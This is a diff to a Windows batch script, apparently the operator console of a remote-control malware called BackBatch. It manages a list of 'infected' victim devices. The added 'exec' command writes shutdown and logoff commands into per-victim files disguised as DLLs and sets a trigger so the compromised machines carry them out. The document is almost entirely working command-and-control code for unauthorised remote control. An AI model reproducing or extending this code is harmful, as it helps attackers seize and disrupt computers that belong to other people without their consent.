@@ -209,6 +209,7 @@ echo !bold!^|!reset!       !blue!info!reset!
 echo !bold!^|!reset!       !blue!clear/cls!reset!
 echo !bold!^|!reset!       !blue!list_devices!reset!
 echo !bold!^|!reset!       !blue!use!reset!
+echo !bold!^|!reset!       !blue!exec!reset!
 echo.
 goto command_inp
 :: _______________________________________________________ END OF SECTION _____________________________________________________________
@@ -216,9 +217,93 @@ goto crash
 
 :command_inp
 set "CmdInput="
+set "EXEC_ARGS="
+set "EXEC_ARGS_2="
+set "EXEC_ARGS_3="
 echo =================== %time% %date%
 set /p "CmdInput=!reset!MCP>: !bold!"
 echo.
+if "!CmdInput!" == "" (
+	echo.
+	goto command_inp
+)
+if "!CmdInput!" == "exec" (
+	echo !reset!!yellow![Invalid command usage]!reset!
+	echo.
+	echo !reset!!bold![Usage]!reset!
+	echo exec --tool:TOOL_ID
+	echo 'TOOL_ID' is the id of the tool you would like to quick execute from.
+	echo.
+	goto command_inp
+)
+if "!CmdInput!" == "exec --tool:1" (
+	echo.
+	set /p "EXEC_ARGS=exec --tool:1 --id:"
+	if exist "!FILE_Devices!\EXEC_ARGS" (
+		set /p "EXEC_ARGS_2=exec --tool:1 --id:!EXEC_ARGS! --command:"
+		if "!EXEC_ARGS_2!" == "shutdown" (
+			set /p "EXEC_ARGS_3=exec --tool:1 --id:!EXEC_ARGS! --command:!EXEC_ARGS_2! --timer:"
+			if exist "!FILE_DEVICES!\!EXEC_ARGS!\CMD_EXEC.dll" (
+				if "!EXEC_ARGS_3!" == "none" (
+					echo shutdown /s /t 0>"!FILE_Devices!\!EXEC_ARGS!\CMD_EXEC.dll"
+				) else (
+					echo shutdown /s /t !EXEC_ARGS_3!>"!FILE_DEVICES!\!EXEC_ARGS!\CMD_EXEC.dll"
+				)
+				if exist "!FILE_Devices!\!EXEC_ARGS!\EXEC_CMD.dll" (
+					echo exec_now>"!FILE_Devices!\!EXEC_ARGS!\EXEC_CMD.dll"
+					ping localhost -n 3 > nul
+					echo dont_exec>"!FILE_Devices!\!EXEC_ARGS!\EXEC_CMD.dll"
+					echo echo No Command>"!FILE_Devices!\!EXEC_ARGS!\CMD_EXEC.dll"
+					echo !reset!!green!Successfully completed shutdown...
+					echo.
+					goto command_inp
+				) else (
+					echo !reset!!red_black!Error:!reset! Cannot find EXEC_CMD.dll, critical error^^!
+					echo.
+					goto command_inp
+				)
+			) else (
+				echo !reset!!red_black!Error:!reset! Cannot find CMD_EXEC.dll, critical error^^!
+				echo.
+				goto command_inp
+			)
+		)
+		if "!EXEC_ARGS_2!" == "logoff" (
+			set /p "EXEC_ARGS_3=exec --tool:1 --id:!EXEC_ARGS! --command:!EXEC_ARGS_2! --timer:"
+			if exist "!FILE_Devices!\!EXEC_ARGS!\CMD_EXEC.dll" (
+				if "!EXEC_ARGS_3!" == "none" (
+					echo shutdown /l /t 0>"!FILE_Devices!\!EXEC_ARGS!\CMD_EXEC.dll"
+				) else (
+					echo shutdown /l /t !EXEC_ARGS_3!>"!FILE_Devices!\!EXEC_ARGS!\CMD_EXEC.dll"
+				)
+				if exist "!FILE_Devices!\!EXEC_ARGS!\EXEC_CMD.dll" (
+					echo exec_now>"!FILE_Devices!\!EXEC_ARGS!\EXEC_CMD.dll"
+					ping localhost -n 3 > nul
+					echo dont_exec>"!FILE_Devices!\!EXEC_ARGS!\EXEC_CMD.dll"
+					echo echo No Command>"!FILE_Devices!\!EXEC_ARGS!\CMD_EXEC.dll"
+					echo !reset!!green!Successfully completed logoff...
+					echo.
+					goto command_inp
+				) else (
+					echo !reset!!red_black!Error:!reset! Cannot find EXEC_CMD.dll, critical error^^!
+					echo.
+					goto command_inp
+				)
+			) else (
+				echo !reset!!red_black!Error:!reset! Cannot find CMD_EXEC.dll, critical error^^!
+				echo.
+				goto command_inp
+			)
+		)
+		echo !reset!!red_black!Error:!reset! This command is invalid^^! [!VICTIM_CMD!]
+		echo.
+		goto command_inp
+	) else (
+		echo !reset!!red_black!Error:!reset! Could not find device [!EXEC_ARGS!]
+		echo.
+		goto command_inp
+	)
+)
 if "!CmdInput!" == "cls" (
 	goto Back_Batch_Console
 )
@@ -246,32 +331,37 @@ goto crash
 set "InfoInp="
 set /p "Info_Inp=!reset!!white_black!Command:!reset! "
 if "!Info_Inp!" == "cls" (
-	echo !yellow!This command clears the console window^^! [Alternative Command: clear]!reset!
+	echo !reset!!yellow!This command clears the console window^^! [Alternative Command: clear]!reset!
 	echo.
 	goto command_inp
 )
 if "!Info_Inp!" == "clear" (
-	echo !yellow!This command clears the console window^^! [Alternative Command: cls]!reset!
+	echo !reset!!yellow!This command clears the console window^^! [Alternative Command: cls]!reset!
 	echo.
 	goto command_inp
 )
 if "!Info_Inp!" == "exit" (
-	echo !yellow!This command exits the BackBatch app^^!!reset!
+	echo !reset!!yellow!This command exits the BackBatch app^^!!reset!
 	echo.
 	goto command_inp
 )
 if "!Info_Inp!" == "info" (
-	echo !yellow!This command gives you info on any of the existing commands^^!!reset!
+	echo !reset!!yellow!This command gives you info on any of the existing commands^^!!reset!
 	echo.
 	goto command_inp
 )
 if "!Info_Inp!" == "list_devices" (
-	echo !yellow!This command will list all the devices infected by BackBatch script^^!!reset!
+	echo !reset!!yellow!This command will list all the devices infected by BackBatch script^^!!reset!
 	echo.
 	goto command_inp
 )
 if "!Info_Inp!" == "use" (
-	echo !yellow!This command allows you to use any of the tools^^!!reset!
+	echo !reset!!yellow!This command allows you to use any of the tools^^!!reset!
+	echo.
+	goto command_inp
+)
+if "!Info_Inp!" == "exec" (
+	echo !reset!!yellow!This command allowed you to quickly execute a tool^^!!reset!
 	echo.
 	goto command_inp
 )
@@ -281,13 +371,13 @@ goto command_inp
 goto crash
 
 :list_devices
-if exist "!FILE_Devices!" (
-	cd !FILE_Devices!
-	dir
+if exist "!FILE_BackBatch!\victims_list.txt" (
+	type "!FILE_BackBatch!\victims_list.txt"
+	echo.
 	echo.
 	goto command_inp
 ) else (
-	echo !reset!!red_black!Error:!reset! The Devices directory !yellow![!FILE_Devices!]!reset! does not exist^^!!reset!
+	echo !reset!!red_black!Error:!reset! The Devices directory !yellow![!FILE_BackBatch!\victims_list.txt]!reset! does not exist^^!!reset!
 	echo.
 	goto command_inp
 )
@@ -345,7 +435,7 @@ if exist "!FILE_Devices!\!Computer_ID_1!" (
 	echo.
 	goto rce_pc_found
 ) else (
-	echo !reset!!red_black!Error:!reset! Could not find computer [!Computer_ID_1!]
+	echo !reset!!red_black!Error:!reset! Could not find device [!Computer_ID_1!]
 	echo.
 	goto command_inp
 )
